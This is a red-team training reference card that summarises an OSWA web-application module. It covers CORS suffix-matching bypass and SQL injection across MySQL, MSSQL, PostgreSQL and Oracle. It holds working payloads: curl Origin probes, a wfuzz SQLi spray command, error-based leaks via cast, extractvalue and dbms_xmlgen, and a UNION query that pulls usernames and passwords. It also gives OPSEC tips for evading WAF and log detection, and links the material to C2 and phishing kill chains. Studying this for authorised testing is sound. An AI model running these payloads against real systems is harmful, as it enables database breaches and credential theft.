---
id: RTO-webapp-sqli-cors
name: Web Application Pentesting — SQL Injection & CORS Misconfiguration
source: OSWA (Offensive Security Web Assessor)
category: c2-infrastructure
analyzed_by: glm-5.2
analysis_date: 2026-07-21
vault_references: [T-019, T-022, T-023]
tags: [web-app-security, sqli, cors, csrf, mysql, mssql, postgresql, oracle, error-based, union-based, stacked-queries, wfuzz, database-enumeration, cast-extractvalue, dbms-xmlgen]
---

# Web Application Pentesting — SQL Injection & CORS Misconfiguration — Training Reference

## TL;DR
This module covers two offensive web skill clusters: (1) exploiting CORS allowlist logic flaws by manipulating the `Origin` header to bypass flawed suffix-matching, and (2) end-to-end SQL injection tradecraft across MySQL, Microsoft SQL Server, PostgreSQL, and Oracle — including version/user enumeration, discovery via string delimiters / boundary testing / wfuzz fuzzing, and exploitation via error-based (`cast`, `extractvalue`, `dbms_xmlgen.getxml`) and UNION-based techniques. The vault is Windows-endpoint-focused and contains **no** direct coverage of web app pentesting, so this material fills a major operational gap — particularly relevant for pre-implant reconnaissance, C2 fronting infrastructure (T-019, T-022), and credential phishing overlays (T-023).

## Key Concepts

1. **CORS allowlist suffix-matching flaw**
   When a server checks whether the `Origin` header *ends with* an allowlisted domain but does not require a leading period separator, an attacker can register an arbitrary domain like `fakeoffensive-security.com` and have it reflected in `Access-Control-Allow-Origin` with credentials. This is harder to weaponize than null/regex bypasses because it requires attacker-controlled DNS, but the JS payload delivery mechanism is identical to standard CORS exfiltration.

2. **SQL dialect divergence across 4 RDBMS**
   MySQL, MSSQL, PostgreSQL, and Oracle share core `SELECT`/`WHERE`/`ORDER BY` syntax but diverge sharply on metadata tables (`information_schema` vs `sys.` vs `pg_database` vs `all_tables`/`all_tab_columns`), version functions (`version()` vs `@@VERSION` vs `version()` vs `v$version`), user functions, and string concatenation operators (`||` for Oracle/PostgreSQL). Payload customization per-target is mandatory; "universal SQLi" is a myth.

3. **Oracle's `DUAL` table requirement**
   Oracle requires a `FROM` clause on every `SELECT`, even for static values/functions. The dummy table `DUAL` (single column `DUMMY`, single row `X`) is the universal filler. This breaks naive payloads that work on MySQL/MSSQL.

4. **Closing-out syntax at injection point**
   Real SQLi payload construction is dominated by "closing out" whatever delimiters and function parentheses exist between the injectable parameter and the end of the developer's query: strings (`'`), `LOWER(name)` calls (`)`), `LIKE '%...%'` wildcards (irrelevant — not delimiters), then appending `--` (or `#` on MySQL) to comment out trailing syntax. Without this discipline, payloads produce syntax errors instead of exfiltration.

5. **Error-based SQLi via type-conversion / XML functions**
   Verbose DB errors leak data when an attacker forces a type conversion that fails with the target value echoed in the error. MSSQL/PostgreSQL: `cast(@@version as integer)`. MySQL: `extractvalue('',concat('>',version()))` — the `>` is an XML delimiter that cannot appear in a valid XPath node name, forcing an XPATH syntax error with the value embedded. Oracle: `to_char(dbms_xmlgen.getxml('select "||(...substr... from v$version where rownum=1)||" from sys.dual'))` — `dbms_xmlgen.getxml()` executes an embedded query and returns XML, and a 30-char `substr` is needed because Oracle caps column names at 30 chars.

6. **UNION-based column matching**
   `UNION ALL` requires both queries to return identical column counts and matching data types per column. Enumeration technique: start with `UNION ALL SELECT null` and increment `null` count until the error disappears. For Oracle, `SELECT null FROM dual`. Static filler values (`0`, `1`) are used to pad short target tables to match the victim query's column count.

7. **Boundary testing as SQLi discovery**
   Submitting out-of-dataset values (e.g., `ORDER BY 5` when 4 columns exist) elicits verbose errors or response-size deltas that fingerprint injection points even when error messages are suppressed. This generalizes beyond `ORDER BY` to any parameter with a constrained expected input space.

8. **wfuzz response-code/size heuristics**
   Fuzzing with `/usr/share/wordlists/wfuzz/Injections/SQL.txt` and interpreting `HTTP 500` with response >2 chars as error-leak candidates and `HTTP 200` with response >2 chars as successful injection candidates is a fast triage method. Burp Repeater is then used for payload confirmation.

9. **Database-specific metadata map (operator cheat sheet)**
   - **MySQL**: `information_schema.tables` (`table_schema`, `table_name`), `information_schema.columns` (`column_name`, `data_type`); `version()`, `current_user()`, `system_user()`.
   - **MSSQL**: `sys.databases` (`name`), `app.information_schema.tables` (`TABLE_NAME`), `app.information_schema.columns` (`COLUMN_NAME`, `DATA_TYPE`); `@@VERSION`, `SYSTEM_USER`; CLI requires `; GO`.
   - **PostgreSQL**: `pg_database` (`datname`), `app.information_schema.tables where table_schema='public'`, `app.information_schema.columns`; `version()`, `current_user` (no parens).
   - **Oracle**: `v$version` (banner), `USER` from `DUAL`, `all_tables` (`owner` for schemas, `table_name`), `all_tab_columns` (`column_name`, `data_type`); 30-char column-name cap matters for `substr()`.

10. **Stacked queries (introduced, not completed)**
    Multiple SQL statements submitted in one call (`;` separator). Support varies by DB engine AND by the language's DB driver. Enables INSERT/UPDATE/DELETE piggybacked onto a SELECT injection — far more destructive/exfiltrative than UNION-based read-only attacks.

## Operational Techniques

### CORS Allowlist Suffix Bypass
- **What**: Exploit a server that reflects `Origin` headers matching a suffix pattern (e.g., `endswith("offensive-security.com")`) without enforcing a leading period boundary.
- **When to use**: Pre-engagement recon on a target with CORS + `Access-Control-Allow-Credentials: true` and an attacker-controlled DNS budget.
- **How**:
  1. `curl -X "OPTIONS" -i -k https://target/allowlist` — baseline, no `Origin` header.
  2. `curl -X "OPTIONS" -i -H "Origin: http://www.offensive-security.com" -k https://target/allowlist` — subdomain test (legitimate variation).
  3. `curl -X "OPTIONS" -i -H "Origin: http://www.offensive-security.net" -k https://target/allowlist` — TLD variation; expect fallback to default if suffix match.
  4. `curl -X "OPTIONS" -i -H "Origin: http://fakeoffensive-security.com" -k https://target/allowlist` — if `Access-Control-Allow-Origin: http://fakeoffensive-security.com` is reflected, suffix matching is flawed.
  5. Register `fakeoffensive-security.com`, host attacker JS, deliver to victim via phishing or stored XSS.
- **Vault link**: No direct vault technique. Tangentially related to T-023 (HTML overlay WebView2 phishing) in that both abuse credential capture via browser-side JS, but T-023 operates on the endpoint, not via cross-origin browser exfiltration.
- **Tool/code**: `curl -X OPTIONS -i -k -H "Origin: ..."`
- **OPSEC**: Reflects attacker-controlled value in response headers — passive observers (WAF, proxy logs) will see anomalous ACAO values. Mitigate by only probing from the attacker-controlled domain once, then weaponizing via phishing page.

### SQL Discovery via String Delimiter Imbalance
- **What**: Submit `'` (single quote) in injectable parameters to unbalance string literals and trigger SQL parse errors.
- **When to use**: First-pass discovery on any input that plausibly feeds a `WHERE col='...'` clause.
- **How**:
  1. Inject `'` into parameter; observe HTTP 500 / SQL error.
  2. If wrapped in `LOWER('...')` or similar, payload becomes `foo') or id=11--` to close string + parenthesis + comment trailing syntax.
  3. For `LIKE LOWER('%...%')`, same closing-out logic — wildcards are not delimiters.
- **Vault link**: None. Vault has no web discovery primitives.
- **Tool/code**: Manual injection via Burp Repeater or browser form.
- **OPSEC**: Triggers 500s in access logs. Suppress by switching to time-based blind if stealth required.

### ORDER BY Column Count Enumeration (Boundary Testing)
- **What**: Iterate `ORDER BY N` until error to count selected columns and confirm injection.
- **When to use**: When `ORDER BY` parameter is injectable, or when confirming query column count before crafting a UNION payload.
- **How**:
  1. Submit `SELECT * FROM menu ORDER BY 4 desc;` (known-good count).
  2. Increment to `ORDER BY 5` — error message reveals column count.
  3. Use count to size UNION payload (e.g., 4 columns → `UNION ALL SELECT null,null,null,null`).
- **Vault link**: None.
- **Tool/code**: SQL Sandbox console at `http://sql-sandbox/sqlconsole`; Burp Repeater for live targets.
- **OPSEC**: Low — looks like normal application use if error responses are similar to baseline.

### wfuzz SQLi Fuzzing
- **What**: Spray a SQLi wordlist against an injectable parameter and triage by response code/length.
- **When to use**: Pre-confirmation phase when many candidate endpoints exist; identifies which to manually exploit.
- **How**:
  1. Capture baseline POST in Burp Suite HTTP history.
  2. `wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt -d "db=mysql&id=FUZZ" -u http://target/api/intro`
  3. Triage: `200` + >2 chars = candidate success; `500` + >2 chars = candidate error leak.
  4. Send candidates to Burp Repeater for manual confirmation.
- **Vault link**: None.
- **Tool/code**: `wfuzz`, Burp Suite, wordlist at `/usr/share/wordlists/wfuzz/Injections/SQL.txt` (125 payloads).
- **OPSEC**: High noise — 125 requests in seconds. Mitigate with rate limiting (`-t 1` for single thread, random delays via `--sleep`).

### Error-Based SQLi via `cast()` (MSSQL / PostgreSQL)
- **What**: Force a string-to-integer cast that fails with the source value echoed in the error.
- **When to use**: Target returns verbose DB errors; need version/credential exfiltration without `UNION`.
- **How**:
  - MSSQL: `cast(@@version as integer)` — submit in injectable field.
  - PostgreSQL: `cast(version() as integer)`.
  - Response contains `conversion failed when converting ... to data type int` followed by the value.
- **Vault link**: None.
- **Tool/code**: Manual payload via Burp Repeater.
- **OPSEC**: Triggers DB error in logs. Mitigate by using this only when other vectors are closed.

### Error-Based SQLi via `extractvalue()` (MySQL)
- **What**: Force an XPATH syntax error in MySQL's XML parser with the target value embedded.
- **When to use**: MySQL target returning errors; `cast()` returns null instead of erroring on MySQL.
- **How**: `extractvalue('',concat('>',version()))`
  - First arg: empty XML fragment.
  - Second arg: `concat('>',...)` — `>` is an XML delimiter, cannot start a valid XPath node name, so XPATH syntax error fires with the concatenated value embedded.
  - Avoid first-char values of `/`, `.`, `@`, or alphanumeric — these start valid XPath and would not error.
- **Vault link**: None.
- **Tool/code**: Manual payload.
- **OPSEC**: Error logged with attacker payload visible. Switch to time-based blind if WAF pattern-matches `extractvalue`.

### Error-Based SQLi via `dbms_xmlgen.getxml()` (Oracle)
- **What**: Construct an Oracle query that builds an invalid column name from a subquery result, causing `ORA-` error with the leaked value.
- **When to use**: Oracle target with verbose errors (rare in production).
- **How**:
  ```sql
  to_char(
    dbms_xmlgen.getxml(
      'select "'||
        (select substr(banner,0,30) from v$version where rownum=1)
      ||'" from sys.dual'
    )
  )
  ```
  - Inner subquery: first 30 chars of `banner` from `v$version` (Oracle column-name cap = 30 chars).
  - `||` concatenates into `'select "<value>" from sys.dual'`.
  - `dbms_xmlgen.getxml()` executes the embedded query, which fails because `<value>` is not a valid column name.
  - Error includes the value as an "invalid identifier".
  - Iterate `substr()` start/stop to extract any value.
- **Vault link**: None.
- **Tool/code**: Manual payload; Oracle sandbox at `http://sql-sandbox`.
- **OPSEC**: High — Oracle errors are loud. Use only against targets known to leak.

### UNION-Based SQLi Data Exfiltration
- **What**: Append `UNION ALL SELECT ...` to inject an attacker-controlled result set rendered by the application.
- **When to use**: Target renders query results in HTTP response; column count and types known or enumerable.
- **How**:
  1. Confirm column count via `ORDER BY N` boundary testing.
  2. Build payload: `0 UNION ALL SELECT id, username, password, 0 from users` (note the trailing `0` static filler to match `price` column type).
  3. Ensure each column's data type matches the victim query's corresponding column.
  4. For Oracle: `0 UNION ALL SELECT id, username, password, 0 from users` (no `FROM dual` needed for UNION arm, but the original query must already have a `FROM`).
  5. Verify the application renders the columns you targeted — some apps hide certain fields.
- **Vault link**: None.
- **Tool/code**: Manual payload via Burp Repeater.
- **OPSEC**: Returns extra rows in response — visible in app logs and possibly to legitimate users if cached.

### Cross-DB Enumeration Queries (Operator Cheat Sheet)
- **What**: Standardized enumeration syntax for version/user/db/table/column discovery across 4 RDBMS.
- **When to use**: Immediately after SQLi is confirmed, before targeting specific data.
- **How**: See "Database-specific metadata map" in Key Concepts above. Key queries:
  - MySQL: `select version();` / `select current_user();` / `select table_schema from information_schema.tables group by table_schema;` / `select column_name, data_type from information_schema.columns where table_schema='app' and table_name='menu';`
  - MSSQL: `select @@version;` / `SELECT SYSTEM_USER;` / `SELECT name FROM sys.databases;` / `select * from app.information_schema.tables;` / `select COLUMN_NAME, DATA_TYPE from app.information_schema.columns where TABLE_NAME='menu';` (CLI requires `; GO`).
  - PostgreSQL: `select version();` / `select current_user;` (no parens) / `select datname from pg_database;` / `select table_name from app.information_schema.tables where table_schema='public';` / `select column_name, data_type from app.information_schema.columns where table_name='menu';`
  - Oracle: `select * from v$version;` (no semicolon in console) / `select user from dual;` / `select owner from all_tables group by owner;` / `select table_name from all_tables where owner='SYS' order by table_name;` / `select column_name, data_type from all_tab_columns where table_name='MENU';`
- **Vault link**: None.
- **Tool/code**: SQL Sandbox at `http://sql-sandbox/sqlconsole`.
- **OPSEC**: High enumeration volume. Mitigate by using `group by` to minimize row counts.

## Tool & Tradecraft Reference

| Tool/Command | Purpose | OPSEC Notes |
|---|---|---|
| `curl -X OPTIONS -i -k -H "Origin: ..."` | Probe CORS allowlist behavior | Reflects attacker value in ACAO; visible in proxy logs |
| `wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt` | SQLi payload fuzzing | 125 requests in seconds; WAF/IDS will flag |
| `/usr/share/wordlists/wfuzz/Injections/SQL.txt` | Pre-built 125-payload SQLi wordlist | Static signatures; rotate or mutate for evasion |
| Burp Suite Repeater | Manual payload iteration | Proxy logs all traffic |
| `cast(@@version as integer)` (MSSQL/Pg) | Error-based version leak | Triggers conversion error in DB logs |
| `extractvalue('',concat('>',version()))` (MySQL) | Error-based version leak via XPATH | WAF may pattern-match `extractvalue` |
| `dbms_xmlgen.getxml('select "'\|\|(...)\|\|'" from sys.dual')` (Oracle) | Error-based leak via invalid identifier | Loud ORA- error; use sparingly |
| `0 UNION ALL SELECT id,username,password,0 from users` | UNION-based data exfil | Extra rows in response; visible to caching layers |
| `ORDER BY N` (incrementing N) | Column count enumeration | Looks like normal app use if errors suppressed |
| `information_schema.tables/columns` (MySQL, MSSQL, Pg) | Metadata discovery | Standard; minimal noise |
| `all_tables`/`all_tab_columns` (Oracle) | Metadata discovery | Returns many system rows; use `WHERE owner=` filter |
| `DUAL` (Oracle) | Dummy table for FROM clause | Oracle-specific; payload fingerprint |
| `--` / `#` | SQL comment markers (end-of-line) | `--` requires trailing space on MySQL; `#` is MySQL-only |

## Gaps & Extensions

**What the vault covers that this training does not:**
- The vault (T-001 through T-023) is exclusively Windows endpoint tradecraft: syscalls, process injection, EDR evasion, persistence, anti-analysis, crypto, networking/protocol, and client capabilities. None of the 23 cards touch web application pentesting, SQLi, CORS, or CSRF.
- T-019 (Edo Dead Drop) and T-022 (Network Suite) cover C2 *transport* infrastructure (HTTP poll, malleable C2, peer relay, Ethereum RPC, rentry.co discovery) but do not cover *attacking* web infrastructure — only *using* it for C2.
- T-023 (HTML overlay WebView2 phishing) covers endpoint-side credential phishing but not cross-origin browser exfiltration against a target's own web app.

**What this training covers that the vault does not:**
- Full web application offensive workflow: CORS misconfig exploitation, SQL dialect divergence across 4 RDBMS, SQLi discovery (string delimiter / boundary / wfuzz), error-based exfil per-DB (`cast`/`extractvalue`/`dbms_xmlgen`), UNION-based exfil, stacked queries (introduced).
- Operator-grade metadata enumeration queries for MySQL, MSSQL, PostgreSQL, Oracle — directly applicable to any engagement that pivots through a web front-end to reach the Windows endpoint tradecraft the vault *does* cover.
- Fuzzing methodology with concrete wordlist path and response-code/size triage heuristics.

**Operational bridge (where this material plugs into vault tradecraft):**
- A typical red team engagement often begins with web app compromise (SQLi → credential dump → RDP/SSH pivot → Windows endpoint). This training supplies the *front end* of that kill chain; the vault supplies the *back end*.
- For C2 infrastructure: knowing how to enumerate a target's MSSQL instance (T-SQL `xp_cmdshell`, `sp_addlinkedserver`) is a natural pre-stage to T-019 dead-drop C2 if the engagement pivots through a SQL Server.
- The CORS material is operationally useful when the engagement includes a credential phishing component (T-023 HTML overlay) — both rely on browser-side JS execution, and CORS bypasses can extend what the overlay can exfiltrate.

## Cross-Reference Matrix

| Training Concept | Vault Technique | Relationship |
|---|---|---|
| CORS allowlist suffix bypass | T-023 (HTML overlay WebView2 phishing) | Adjacent — both weaponize browser-side JS for credential capture; T-023 is endpoint-side, CORS bypass is server-side |
| CORS pre-flight probing via curl | T-019 (Edo Dead Drop), T-022 (Network Suite) | Methodological — both involve HTTP probing of target infrastructure; T-019/022 use HTTP for C2, this uses it for recon |
| SQLi credential dump | T-023 (credential harvest, browser session) | Complementary — SQLi can yield plaintext creds that bypass need for browser hook |
| wfuzz response triage heuristics | T-020 (Anti-Analysis diagnostic harness) | Methodological — both use marker-based verification of technique success |
| Multi-DB enumeration syntax | (none) | Vault gap — no equivalent |
| Error-based SQLi (`cast`/`extractvalue`/`dbms_xmlgen`) | (none) | Vault gap — no equivalent |
| UNION-based SQLi | (none) | Vault gap — no equivalent |
| Stacked queries | (none) | Vault gap — no equivalent |
| Oracle `DUAL` / 30-char column cap | (none) | Vault gap — no equivalent |
| SQL syntax fundamentals | (none) | Vault gap — no equivalent |
| CORS / CSRF fundamentals | (none) | Vault gap — no equivalent |

**Verdict**: This OSWA module is a *front-end complement* to a vault that is otherwise back-end/endpoint-complete. It is not superseded by any vault technique and should be retained as a standalone reference for any engagement that includes a web application attack surface. The vault's categorization scheme (`c2-infrastructure|winapi|process-injection|evasion|edr-bypass|wdac-asr|telemetry`) has no clean home for web app content; this document is filed under `c2-infrastructure` as the least-bad fit pending a dedicated `web-app` category.